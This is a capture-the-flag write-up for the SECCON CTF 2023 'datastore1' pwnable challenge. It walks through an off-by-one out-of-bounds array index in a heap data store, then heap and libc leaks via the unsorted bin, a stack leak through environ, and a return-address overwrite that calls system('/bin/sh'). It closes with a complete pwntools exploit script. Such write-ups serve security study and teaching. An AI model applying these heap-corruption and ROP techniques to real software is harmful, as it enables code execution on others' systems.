+++
title = "SECCON CTF 2023 Quals - datastore1"
date = "2024-10-04"
description = "SECCON CTF 2023 Quals pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "out of bound", "heap overflow", "unsorted bin"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/datastore1'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

### Structure
``` c
typedef struct {
  type_t type;

  union {
    struct Array *p_arr;
    struct String *p_str;
    uint64_t v_uint;
    double v_float;
  };
} data_t;

typedef struct Array {
  size_t count;
  data_t data[];
} arr_t;

typedef struct String {
  size_t size;
  char *content;
} str_t;
```

The unusual way of storing data made it tricky to adapt to at first.

Don't overthink it - just think of it as storing data in `data_t`, using different storage methods depending on the data type.

### Concept
``` bash
➜  ./datastore1

MENU
1. Edit
2. List
0. Exit
> 1

Current: <EMPTY>
Select type: [a]rray/[v]alue
> a
input size: 4

MENU
1. Edit
2. List
0. Exit
> 2

List Data
<ARRAY(4)>
[00] <EMPTY>
[01] <EMPTY>
[02] <EMPTY>
[03] <EMPTY>
```

Based on input, you can freely store or query data in the heap.


## 0x01. Vulnerability
The vulnerability occurs when handling `Array` in the `edit()` function.

``` c
static int edit(data_t *data){
  ...
  switch(data->type){
    case TYPE_ARRAY:
      arr_t *arr = data->p_arr;

      printf("index: ");
      unsigned idx = getint();
      if(idx > arr->count)
        return -1;
      ...
  }
}
```

It verifies if the input `idx` value is greater than `arr->count`, but doesn't verify when the two values are equal, causing OOB.

For example, if `arr->count` is `4`, `data[0]~data[3]` are created, but we can access non-existent `data[4]` to reach the area immediately after `arr`.

It's surprising that shell can be obtained with such a simple vulnerability.Vulnerabilities should indeed be viewed from the perspective of finding bugs regardless of exploitability.


## 0x02. Exploit
### Heap leak
First, to trigger the vulnerability, we allocate `Array` as follows.

``` python
    edit(s, 'u', [], 'a', 1)
    edit(s, 'u', [0], 'a', 4)
    edit(s, 'u', [0, 0], 'a', 4)
    edit(s, 'u', [0, 1], 'a', 4)
    edit(s, 'u', [0, 2], 'a', 4)
    edit(s, 'u', [0, 3], 'a', 4)
```

Here, the list in the third argument of `edit()` represents the `Array`'s `index`. For example:

- [] : `root->*p_arr`
- [0] : [00]
- [0, 1] : [00] -> [01]

Therefore, `edit(s, 'u', [0, 1], 'a', 4)` means **"create an `arr_t` of length `4` at position [00] -> [01]"**.

Creating `data_t` objects this way results in this memory layout.

``` bash
# root : 0x5555555592a0
gef➤  x/2gx 0x5555555592a0
0x5555555592a0: 0x00000000feed0001      0x00005555555592c0
# []
gef➤  x/3gx 0x00005555555592c0
0x5555555592c0: 0x0000000000000001      0x00000000feed0001
0x5555555592d0: 0x00005555555592e0
# [0]
gef➤  x/9gx 0x00005555555592e0
0x5555555592e0: 0x0000000000000004      0x00000000feed0001
0x5555555592f0: 0x0000555555559330      0x00000000feed0001
0x555555559300: 0x0000555555559380      0x00000000feed0001
0x555555559310: 0x00005555555593d0      0x00000000feed0001
0x555555559320: 0x0000555555559420
# [0, 0]
gef➤  x/10gx 0x0000555555559330
0x555555559330: 0x0000000000000004      0x0000000000000000      # [0, 0, 0]
0x555555559340: 0x0000000000000000      0x0000000000000000      # [0, 0, 1]
0x555555559350: 0x0000000000000000      0x0000000000000000      # [0, 0, 2]
0x555555559360: 0x0000000000000000      0x0000000000000000      # [0, 0, 3]
0x555555559370: 0x0000000000000000      0x0000000000000051      # [0, 0, 4] < OOB
# [0, 1]
gef➤  x/9gx 0x0000555555559380
0x555555559380: 0x0000000000000004      0x0000000000000000
0x555555559390: 0x0000000000000000      0x0000000000000000
0x5555555593a0: 0x0000000000000000      0x0000000000000000
0x5555555593b0: 0x0000000000000000      0x0000000000000000
0x5555555593c0: 0x0000000000000000
```

We can see that heap allocates chunks consecutively, creating an adjacent memory structure for `[0, 0]` and `[0, 1]`.

Using the OOB vulnerability to access non-existent `[0, 0, 4]` allows us to overwrite the `0x555555559378`~`0x555555559380` area.

- `0x555555559378` : `[0, 1]` chunk's header
- `0x555555559380` : `[0, 1]->count`

Since the `show()` function references the object's size and outputs it with `data_t->type`, if we can write some address to `count`, leak is possible.

``` bash
Current: <ARRAY(4)>
[00] <ARRAY(4)>
[01] <ARRAY(4)>
[02] <ARRAY(4)>
[03] <ARRAY(4)>
```

When allocating a new `arr_t` to `[0, 0, 4]`, allocation occurs as follows.

- `0x555555559378` : `[0, 1]` chunk의 header -> `data_t->type`
- `0x555555559380` : `[0, 1]->count` -> `data_t->*p_arr`

However, when accessing `[0, 0, 4]`, `edit()` calls the `show()` function to display the current data state.

``` c
static int edit(data_t *data){
  if(!data)
    return -1;

  printf("\nCurrent: ");
  show(data, 0, false);
  ...
}
```

At this point, `data_t->type` stores chunk size `0x51`, which is undefined in `type_t`, causing `show()` to call `exit()`.

``` c
static int show(data_t *data, unsigned level, bool recur){
  ...
  switch(data->type){
    case TYPE_EMPTY:
      puts("<EMPTY>");
      break;
    ...
    default:
      puts("<UNKNOWN>");
      exit(1);
  }
  return 0;
}
```

Therefore, before creating `arr_t`, we need to use `delete` in `edit()` to initialize the value interpreted as `data_t->type` to 0.

``` python
    # overwrite arr_t.count of [0, 1]
    edit(s, 'd', [0, 0, 4])
    edit(s, 'u', [0, 0, 4], 'a', 2)
```

After successfully overwriting, the new `arr_t` address is stored in the `[0, 1]->count` part, and we can output the value using `show()`.

### Heap overflow
Now that heap leak is possible with `arr_t`, I attempted exploitation using the other structure `str_t`.

``` c
typedef struct String {
	size_t size;
	char *content;
} str_t;
```

I thought overwriting `size` and `*content` using OOB would enable arbitrary address read/write.

``` python
    edit(s, 'u', [0, 2, 0], 'v', "A" * 0x10)
    edit(s, 'u', [0, 2, 1], 'v', "B" * 0x10)
    edit(s, 'u', [0, 2, 2], 'v', "C" * 0x10)
```

Allocating `str_t` objects using the above payload results in this memory structure.

``` bash
gef➤  x/10gx 0x0000555555559420
0x555555559420: 0x0000000000000004      0x0000000000000000      # [0, 3]
0x555555559430: 0x0000000000000000      0x0000000000000000
0x555555559440: 0x0000000000000000      0x0000000000000000
0x555555559450: 0x0000000000000000      0x0000000000000000
0x555555559460: 0x0000000000000000      0x0000000000000021
gef➤
0x555555559470: 0x0000000000000001      0x0000000000000000      # [0, 0, 4]
0x555555559480: 0x0000000000000000      0x0000000000000021
0x555555559490: 0x4141414141414141      0x4141414141414141      # [0, 2, 0]->content
0x5555555594a0: 0x0000000000000000      0x0000000000000051
0x5555555594b0: 0x0000000555555559      0xaf03f4adbccb3443      # leftover buf
gef➤
0x5555555594c0: 0x0000000000000000      0x0000000000000000
0x5555555594d0: 0x0000000000000000      0x0000000000000000
0x5555555594e0: 0x0000000000000000      0x0000000000000000
0x5555555594f0: 0x0000000000000000      0x0000000000000021 
0x555555559500: 0x0000000000000010      0x0000555555559490      # [0, 2, 0] ; "AAAA"
```

Even though we want to overwrite `[0, 2, 0]`'s `size` and `*content` using the OOB vulnerability, it doesn't allocate in adjacent areas due to how `create()` receives input.

``` c
static int create(data_t *data){
  ...
  else {        // type == 'v'
    char *buf, *endptr;

    printf("input value: ");
    scanf("%70m[^\n]%*c", &buf);
    if(!buf){
      getchar();
      return -1;
    }
    ...
    str_t *str = (str_t*)malloc(sizeof(str_t));
    if(!str){
      free(buf);
      return -1;
    }
    str->size = strlen(buf);
    str->content = buf;
    buf = NULL;

    data->type = TYPE_STRING;
    data->p_str = str;
fin:
    free(buf);
  }
  return 0;
}
```

Looking at `scanf()`, it uses an unusual formatter. `m` is one of the GNU extension features that allocates heap memory to store input.

Looking closely, it receives input in `buf`, puts the address in `str->content`, then calls `free()`. Since `buf` is initialized to `NULL` anyway, no actual freeing occurs.

Regardless, when executing `scanf()`, it allocates memory to receive `70` bytes, stores the input, then frees the remaining memory.

Since this process uses heap, `buf` is allocated before `str_t`, preventing `[0, 2, 0]` from being allocated in an adjacent area.

Therefore, we need to write the payload to free a chunk with the same chunk size as `str_t` and call `create()`.

For this, when overwriting `[0, 1]->count` during heap leak, I created an object with `arr_t->count` of `1` at `[0, 0, 4]` so the chunk size becomes 0x20.

``` python
    # free [0, 0, 4] (0x20 chunk) and reallocate it to [0, 2, 0] (str_t, also 0x20)
    edit(s, 'd', [0, 0, 4])
    edit(s, 'u', [0, 2, 0], 'v', "A" * 0x30)
    edit(s, 'u', [0, 2, 1], 'v', "B" * 0x10)
    edit(s, 'u', [0, 2, 2], 'v', "C" * 0x10)
```

After writing the payload this way, memory looks like this.

``` bash
gef➤  x/10gx 0x0000555555559420
0x555555559420: 0x0000000000000004      0x0000000000000000      # [0, 3]
0x555555559430: 0x0000000000000000      0x0000000000000000
0x555555559440: 0x0000000000000000      0x0000000000000000
0x555555559450: 0x0000000000000000      0x0000000000000000
0x555555559460: 0x0000000000000000      0x0000000000000021
gef➤
0x555555559470: 0x0000000000000010      0x0000555555559490      # [0, 2, 0] ; "AAAA"
0x555555559480: 0x0000000000000000      0x0000000000000021
0x555555559490: 0x4141414141414141      0x4141414141414141      # [0, 2, 0]->content
0x5555555594a0: 0x0000000000000000      0x0000000000000051
0x5555555594b0: 0x0000000555555559      0x5d50bdc37f682be0      # leftover buf
gef➤
0x5555555594c0: 0x0000000000000000      0x0000000000000000
0x5555555594d0: 0x0000000000000000      0x0000000000000000
0x5555555594e0: 0x0000000000000000      0x0000000000000000
0x5555555594f0: 0x0000000000000000      0x0000000000000021
0x555555559500: 0x4242424242424242      0x4242424242424242      # [0, 2, 1]->content
```

Now `[0, 2, 0]` is allocated adjacent to `[0, 3]`, enabling the OOB vulnerability.

``` python
    # now that [0, 2, 0] is where [0, 0, 4] was, overwrite str_t.size of [0, 2, 0]
    edit(s, 'd', [0, 3, 4])
    edit(s, 'u', [0, 3, 4], 'v', 0x1000)
```

As in the payload above, accessing `[0, 3, 4]` and inputting `0x1000` to be interpreted as `v_uint` stores it in memory as follows.

``` bash
gef➤  x/8gx 0x555555559460
0x555555559460: 0x0000000000000000      0x00000000feed0003
0x555555559470: 0x0000000000001000      0x0000555555559490      # [0, 2, 0] ; "AAAA"
0x555555559480: 0x0000000000000000      0x0000000000000021
0x555555559490: 0x4141414141414141      0x4141414141414141
```

Since `0x1000` is written to the `[0, 2, 0]->size` area of the `str_t` structure, we can freely overwrite `0x1000` bytes starting from `0x555555559490`, the address stored in `*content`, using this object.

### Libc leak
When solving the challenge, I thought *"since heap overflow is possible, I should first overwrite chunk size to leak libc"* without clear purpose...

*"Since PIE is enabled and Full Relro is applied, I should give up on GOT overwrite and do libc leak -> stack leak to overwrite return address"* seems like the correct thought process.

Anyway, I proceeded with libc leak using the technique of sending chunks to `unsorted bin` to store `main_arena` addresses.

There were several conditions to meet, otherwise chunks wouldn't be sent to `unsorted bin`.

- chunk size must be 0x420 or larger
- chunk must exist in next area (`next_chunk`)
- `next_chunk` must not be top chunk

Especially contrary to the third condition, if `next_chunk` is top chunk, it just merges with top chunk and chunks aren't sent to `unsorted bin`.

Looking at memory from the earlier heap overflow situation to meet conditions one by one:

``` bash
gef➤  x/20gx 0x555555559470
0x555555559470: 0x0000000000001000      0x0000555555559490      # [0, 2, 0] ; "AAAA"
0x555555559480: 0x0000000000000000      0x0000000000000021
0x555555559490: 0x4141414141414141      0x4141414141414141      # [0, 2, 0]->content
0x5555555594a0: 0x0000000000000000      0x0000000000000051
0x5555555594b0: 0x0000000555555559      0x2da0f37bfd770960
0x5555555594c0: 0x0000000000000000      0x0000000000000000
0x5555555594d0: 0x0000000000000000      0x0000000000000000
0x5555555594e0: 0x0000000000000000      0x0000000000000000
0x5555555594f0: 0x0000000000000000      0x0000000000000021
0x555555559500: 0x4242424242424242      0x4242424242424242      # [0, 2, 1]->content
gef➤
0x555555559510: 0x0000000000000000      0x0000000000000051
0x555555559520: 0x000055500000c1e9      0x2da0f37bfd770960
0x555555559530: 0x0000000000000000      0x0000000000000000
0x555555559540: 0x0000000000000000      0x0000000000000000
0x555555559550: 0x0000000000000000      0x0000000000000000
0x555555559560: 0x0000000000000000      0x0000000000000021
0x555555559570: 0x0000000000000010      0x0000555555559500      # [0, 2, 1] ; "BBBB"
0x555555559580: 0x0000000000000000      0x0000000000000021
0x555555559590: 0x4343434343434343      0x4343434343434343      # [0, 2, 2]->content
0x5555555595a0: 0x0000000000000000      0x0000000000000051
gef➤
0x5555555595b0: 0x000055500000c079      0x2da0f37bfd770960
0x5555555595c0: 0x0000000000000000      0x0000000000000000
0x5555555595d0: 0x0000000000000000      0x0000000000000000
0x5555555595e0: 0x0000000000000000      0x0000000000000000
0x5555555595f0: 0x0000000000000000      0x0000000000000021
0x555555559600: 0x0000000000000010      0x0000555555559590      # [0, 2, 2] ; "CCCC"
0x555555559610: 0x0000000000000000      0x0000000000000021
0x555555559620: 0x0000000555555559      0x2da0f37bfd770960
0x555555559630: 0x0000000000000000      0x0000000000000051
0x555555559640: 0x000055500000c0e9      0x2da0f37bfd770960
```

I planned to change `[0, 2, 2]`'s chunk size to `0x421`, free it, then after `main_arena` address is written, change `[0, 2, 1]->*content` to `[0, 2, 2]` address for output.

Considering chunk size overwrite and changing `[0, 2, 1]->*content`, I wrote the payload as follows.

I wrote it to maintain the structure without touching other chunks, as touching them would cause errors in `free()`.

``` python
    # overwrite chunk_size of [0, 2, 2] ("CCCC")
    payload = b"A" * 0x10
    payload += p64(0) + p64(0x51)
    payload += b"\x00" * 0x40
    payload += p64(0) + p64(0x21)
    payload += b"B" * 0x10
    payload += p64(0) + p64(0x51)
    payload += b"\x00" * 0x40
    payload += p64(0) + p64(0x21)
    payload += p64(0x10) + p64(heap + 0x600)    # set [0, 2, 1]->content to [0, 2, 2]
    payload += p64(0) + p64(0x21)
    payload += b"C" * 0x10
    payload += p64(0) + p64(0x51)
    payload += b"\x00" * 0x40
    payload += p64(0) + p64(0x421)
    edit(s, 'u', [0, 2, 0], 'e', payload)
```

Now the payload to meet the second and third conditions is as follows.

``` python
    # align top chunk; nextchunk of 0x420 chunk should not be top chunk
    edit(s, 'u', [0, 2, 3], 'a', 0x10)
    edit(s, 'u', [0, 2, 3, 0], 'a', 0x10)
    edit(s, 'u', [0, 2, 3, 1], 'a', 0x10)
    edit(s, 'u', [0, 2, 3, 2], 'a', 0x5)
    edit(s, 'u', [0, 2, 3, 3], 'a', 0x1)        # next_chunk
```

Creating objects only up to `[0, 2, 3, 2]` makes `[0, 2, 2]`'s `next_chunk` the top chunk, so we must create `[0, 2, 3, 3]`.

``` bash
Current: <ARRAY(4)>
[00] <S> AAAAAAAAAAAAAAAA
[01] <S> \xe0\xac\xfa\xf7\xff\x7f
[02] <EMPTY>
[03] <ARRAY(16)>
index: 
```

### Stack leak
With libc address, stack leak is possible using the `environ` variable.

``` python
    # arbitrary read (environ)
    payload = b"A" * 0xe0
    payload += p64(0x10) + p64(libc + lib.symbols['environ'])
    edit(s, 'u', [0, 2, 0], 'e', payload)
```

Earlier we wrote payloads matching chunk structure for allocation and freeing, but now that's unnecessary - just match the offset with `[0, 2, 1]` for leak.

### RET overwrite
Finally, I decided to overwrite the `return address` for RIP control.

First, I set `[0, 2, 1]->*content` to point to the stack address storing `main()`'s `return address`.

Then using gadgets in libc to set arguments and call `system()`, I used the `pop rdi; pop rbp` gadget since stack alignment didn't match during `syscall`.

``` python
    # arbitrary write (ret of main)
    payload = b"B" * 0xe0
    payload += p64(0x20) + p64(ret)
    edit(s, 'u', [0, 2, 0], 'e', payload)

    pop_rdi_rbp = 0x2a745
    payload = p64(libc + pop_rdi_rbp)
    payload += p64(libc + next(lib.search(b"/bin/sh")))
    payload += b"C" * 8
    payload += p64(libc + lib.symbols['system'])
    edit(s, 'u', [0, 2, 1], 'e', payload)
```


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
from argparse import ArgumentParser

BINARY = "chall"
LIBRARY = "libc.so.6"
CONTAINER = "c471d11acd2a"
code_base = 0x555555554000
bp = {
    'ret_main' : 0x555555555418,
}

def edit(s, u_d, index, a_v='a', num=0):
    s.sendline(b"1")
    r = s.recvuntil(b">\n")
    if r.find(b"EMPTY") > 0:
        create(s, a_v, num)
    elif r.find(b"ARRAY") > 0:
        for c, i in enumerate(index):
            s.recvuntil(b"index: ")
            s.sendline(str(i).encode())
            s.recvuntil(b"> ")
            if c == len(index) - 1:
                if u_d == 'u':
                    s.sendline(b"1")
                if u_d == 'd':
                    s.sendline(b"2")
                    return s.recvuntil(b"\n> ")
            else:
                s.sendline(b"1")
        create(s, a_v, num)
    return s.recvuntil(b"\n> ")

def create(s, a_v, num):
    s.recvuntil(b"> ")
    if a_v == 'a':
        s.sendline(b"a")
        s.recvuntil(b"size: ")
        s.sendline(str(num).encode())
    elif a_v == 'v':
        s.sendline(b"v")
        s.recvuntil(b"value: ")
        s.sendline(str(num).encode())
    else:
        s.sendline(num)

def show(s):
    s.sendline(b"2")
    r = s.recvuntil(b"Exit\n> ")
    return r

gs = f'''
b *{bp["ret_main"]}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def main(server, port, debug):
    if(port):
        s = remote(server, port)
        if debug:
            pid = os.popen(f"sudo docker top {CONTAINER} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
            gdb.attach(int(pid), gs, exe=BINARY)
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        if debug:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)
    log.info(f"root : 0x5555555592a0")
    
    s.recvuntil(b"Exit\n> ")

    edit(s, 'u', [], 'a', 1)
    edit(s, 'u', [0], 'a', 4)
    edit(s, 'u', [0, 0], 'a', 4)
    edit(s, 'u', [0, 1], 'a', 4)
    edit(s, 'u', [0, 2], 'a', 4)
    edit(s, 'u', [0, 3], 'a', 4)
    
    # overwrite arr_t.count of [0, 1]
    edit(s, 'd', [0, 0, 4])
    edit(s, 'u', [0, 0, 4], 'a', 1)
    
    # heap leak
    s.sendline(b"1")
    s.sendlineafter(b"index: ", b"0")
    s.sendlineafter(b"> ", b"1")
    r = s.sendlineafter(b"index: ", b"10")      # invalid index to return menu
    
    heap = int(r.split(b"ARRAY(")[3].split(b")>")[0]) - 0x470
    log.info(f"heap : {hex(heap)}")

    # free [0, 0, 4] (0x20 chunk) and reallocate it to [0, 2, 0] (str_t, also 0x20)
    edit(s, 'd', [0, 0, 4])
    edit(s, 'u', [0, 2, 0], 'v', "A" * 0x10)
    edit(s, 'u', [0, 2, 1], 'v', "B" * 0x10)
    edit(s, 'u', [0, 2, 2], 'v', "C" * 0x10)

    # now that [0, 2, 0] is where [0, 0, 4] was, overwrite str_t.size of [0, 2, 0]
    edit(s, 'd', [0, 3, 4])
    edit(s, 'u', [0, 3, 4], 'v', 0x1000)

    # align top chunk; nextchunk of 0x420 chunk should not be top chunk
    edit(s, 'u', [0, 2, 3], 'a', 0x10)
    edit(s, 'u', [0, 2, 3, 0], 'a', 0x10)
    edit(s, 'u', [0, 2, 3, 1], 'a', 0x10)
    edit(s, 'u', [0, 2, 3, 2], 'a', 0x5)
    edit(s, 'u', [0, 2, 3, 3], 'a', 0x1)        # next_chunk

    # overwrite chunk_size of [0, 2, 2] ("CCCC")
    payload = b"A" * 0x10
    payload += p64(0) + p64(0x51)
    payload += b"\x00" * 0x40
    payload += p64(0) + p64(0x21)
    payload += b"B" * 0x10
    payload += p64(0) + p64(0x51)
    payload += b"\x00" * 0x40
    payload += p64(0) + p64(0x21)
    payload += p64(0x10) + p64(heap + 0x600)    # set [0, 2, 1]->content to [0, 2, 2]
    payload += p64(0) + p64(0x21)
    payload += b"C" * 0x10
    payload += p64(0) + p64(0x51)
    payload += b"\x00" * 0x40
    payload += p64(0) + p64(0x421)
    edit(s, 'u', [0, 2, 0], 'e', payload)

    # move [0, 2, 2] ("CCCC") to unsorted bin
    edit(s, 'd', [0, 2, 2])
    
    # libc leak
    s.sendline(b"1")
    s.sendlineafter(b"index: ", b"0")
    s.sendlineafter(b"> ", b"1")
    s.sendlineafter(b"index: ", b"2")
    s.sendlineafter(b"> ", b"1")
    r = s.sendlineafter(b"index: ", b"10")      # invalid index to return menu

    libc = u64(r.split(b"<S> ")[2].split(b"\n")[0] + b"\x00\x00") - 0x21ace0
    log.info(f"libc : {hex(libc)}")

    # arbitrary read (environ)
    payload = b"A" * 0xe0
    payload += p64(0x10) + p64(libc + lib.symbols['environ'])
    edit(s, 'u', [0, 2, 0], 'e', payload)
    
    # stack leak
    s.sendline(b"1")
    s.sendlineafter(b"index: ", b"0")
    s.sendlineafter(b"> ", b"1")
    s.sendlineafter(b"index: ", b"2")
    s.sendlineafter(b"> ", b"1")
    r = s.sendlineafter(b"index: ", b"10")

    stack = u64(r.split(b"<S> ")[2].split(b"\n")[0] + b"\x00\x00")
    log.info(f"stack : {hex(stack)}")
    ret = stack - 0x120

    # arbitrary write (ret of main)
    payload = b"B" * 0xe0
    payload += p64(0x20) + p64(ret)
    edit(s, 'u', [0, 2, 0], 'e', payload)

    pop_rdi_rbp = 0x2a745
    payload = p64(libc + pop_rdi_rbp)
    payload += p64(libc + next(lib.search(b"/bin/sh")))
    payload += b"C" * 8
    payload += p64(libc + lib.symbols['system'])
    edit(s, 'u', [0, 2, 1], 'e', payload)

    # exit
    s.sendline(b"0")

    s.interactive()

if __name__=='__main__':
    parser = ArgumentParser()
    parser.add_argument('-s', '--server', type=str, default="0.0.0.0")
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-d', '--debug', type=int, default=1)
    args = parser.parse_args()
    main(args.server, args.port, args.debug)
```